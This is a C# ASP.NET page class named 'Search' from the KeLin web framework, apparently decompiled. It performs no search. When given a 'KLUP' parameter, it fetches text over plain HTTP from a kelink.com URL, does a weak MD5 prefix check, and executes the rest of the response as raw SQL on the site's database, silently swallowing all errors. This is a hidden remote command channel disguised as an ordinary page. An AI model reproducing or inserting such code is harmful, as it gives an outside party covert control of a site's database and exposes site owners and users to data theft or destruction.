using System;
using System.Data;
using KeLin.ClassManager;
using KeLin.ClassManager.ExUtility;
using KeLin.ClassManager.Tool;
using KeLin.WebSite;

public class Search : PageWap
{
	private string string_10 = PubConstant.GetAppString("InstanceName");

	protected void Page_Load(object sender, EventArgs e)
	{
		string connectionString = PubConstant.GetConnectionString(string_10);
		if (!(GetRequestValue("KLUP") != ""))
		{
			return;
		}
		try
		{
			string requestValue = GetRequestValue("KLUP");
			string page = WapTool.GetPage("http://www.kelink.com/download/update.aspx", "KLUP=" + requestValue, "POST");
			string text = "";
			if (page.Length > 16 && page.Substring(0, 16).ToLower() == PubConstant.md5(requestValue).ToLower())
			{
				text = page.Substring(16, page.Length - 16);
				DbHelperSQL.ExecuteNonQuery(connectionString, CommandType.Text, text);
			}
		}
		catch (Exception)
		{
		}
	}
}
